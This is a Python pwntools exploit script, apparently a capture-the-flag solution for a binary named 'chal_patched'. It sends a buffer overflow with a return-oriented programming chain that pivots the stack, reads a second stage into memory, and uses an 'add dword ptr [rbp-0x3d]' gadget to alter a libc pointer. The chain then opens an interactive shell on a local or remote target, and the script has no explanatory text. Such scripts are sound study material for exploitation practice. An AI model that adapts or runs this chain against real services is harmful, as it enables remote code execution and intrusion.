#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chal_patched")
# libc = ELF("./libc.so.6")
gs = """
b *0x04011D9
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

RDI_RET = 0x0000000000401293
RSI_R15_RET = 0x0000000000401291
RDX_RET = 0x00000000004011e2
RBX_RBP_R12_R13_R14_R15_RET = 0x40128A
RBP_RET = 0x000000000040115d

p.send(b'A'*0x10+p64(0x404500) +
       p64(RDI_RET)+p64(0) +
       p64(RSI_R15_RET)+p64(0x404500+8) + p64(0) +
       p64(RDX_RET)+p64(0x100) +
       p64(e.plt.read) +
       p64(0x00000000004011d8)
       )
pause()
p.send(
    p64(e.sym.main) +
    p64(RBX_RBP_R12_R13_R14_R15_RET) +
    p64(0x61cc3) +
    p64(0x4044d0+0x3d) +
    p64(0)*4 +
    p64(0x000000000040115c) +  # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    p64(RSI_R15_RET)+p64(0) + p64(0) +
    p64(RDX_RET)+p64(0) +
    p64(RBP_RET)+p64(0x4044d0-8) +
    p64(0x00000000004011d8)
)
pause()
p.send(b'A')
pause()
p.sendline(b'exec 1>&2')

p.interactive()
